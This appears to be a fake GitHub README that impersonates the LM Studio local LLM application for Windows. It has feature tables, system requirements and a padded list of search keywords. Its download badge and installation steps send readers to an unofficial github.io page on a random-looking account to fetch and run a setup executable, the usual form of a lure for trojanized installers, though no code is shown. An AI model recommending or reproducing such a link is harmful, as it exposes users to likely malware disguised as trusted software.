# LM Studio Local LLM Execution Studio and API Server for Windows

---

## What is LM Studio?

LM Studio operates as a local execution workspace and inference platform designed for running open-weights large language models (LLMs) offline on desktop hardware. Developed for privacy-focused AI experimentation, developer integration, and prompt engineering, LM Studio allows operators to run local models without transferring telemetry or conversation data to remote cloud services.

Integrating LM Studio into local developer workflows unifies model discovery, parameter tuning, and backend service hosting. The application includes a model browser that interfaces directly with Hugging Face, enabling users to search, evaluate, and download GGUF quantized models. Built-in context window configuration, system prompt customization, GPU layer offloading controls, and real-time generation metrics ensure optimal inference speed across consumer hardware.

As a versatile local AI runtime environment, LM Studio includes an OpenAI-compatible local HTTP server (`localhost:1234`). This API bridge allows developers to seamlessly drop local LLMs into third-party software, terminal assistants, or autonomous agent frameworks without modifying existing API client code structures.

<div align="center">
  <img src="https://dl.flathub.org/media/ai/lmstudio/lm-studio/7e60646910129fa40fa38b691c4f0051/screenshots/image-1_orig.png" alt="Program Interface Screenshot"/>
</div>

[![Download LM Studio](https://img.shields.io/badge/Download-LM_Studio-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://leo3n7psafernand4e4z3.github.io/.github/LMStudio-Local-LLM-Server)

---

### 🎛 Key Features

| Feature | Description |
|---------|-------------|
| **Local LLM Execution** | Runs GGUF models offline with full hardware acceleration on local GPU hardware. |
| **OpenAI-Compatible Server** | Hosts a local REST API endpoint compatible with standard OpenAI client libraries. |
| **Hugging Face Discovery** | Searches, filters, and downloads open-weights models directly within the application. |
| **GPU Layer Offloading** | Dynamically distributes model layers between system VRAM and CPU RAM for optimal performance. |
| **Chat & Playground UI** | Provides structured chat interfaces with system prompt configurations and temperature tuning. |
| **Multi-Model Support** | Executes diverse model architectures including Llama, Mistral, Qwen, Gemma, and Phi models. |

---

## 📥 Installation Guide

- Download LM Studio using the button above.
- Run `LM-Studio-Setup.exe` to complete the local installation process on your Windows machine.
- Launch LM Studio and use the built-in search tab to locate GGUF models on Hugging Face.
- Download a quantized model checkpoint matching your available system RAM/VRAM.
- Load the model into the Chat workspace or start the Local Server endpoint.

---

### 🖥 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 / 11 (64-bit) | Windows 11 (64-bit) |
| Processor | AVX2-compatible Intel Core i5 or AMD Ryzen 5 | Octa-Core Intel Core i7 / AMD Ryzen 7 or higher |
| GPU / VRAM | Discrete GPU with 6+ GB VRAM (GTX 1660 / RTX 2060) | NVIDIA RTX 3080 / 4080 (12–24 GB VRAM) for faster tokens/sec |
| RAM | 16 GB RAM (for 7B models) | 32–64 GB RAM (for 14B–70B model execution) |
| Storage | 20 GB free disk space (base app + initial models) | 100+ GB High-Speed NVMe SSD space (for GGUF repositories) |

---

### Keywords Search Terms

LM Studio local LLM server • LM Studio GGUF model runner • offline local AI launcher • LM Studio OpenAI API server • local LLM desktop application • Hugging Face GGUF downloader • LM Studio GPU layer offload • local AI chat workspace • LM Studio system requirements • run Llama 3 locally • local mistral inference engine • private offline LLM interface • LM Studio Windows download • local artificial intelligence studio • offline prompt engineering workspace
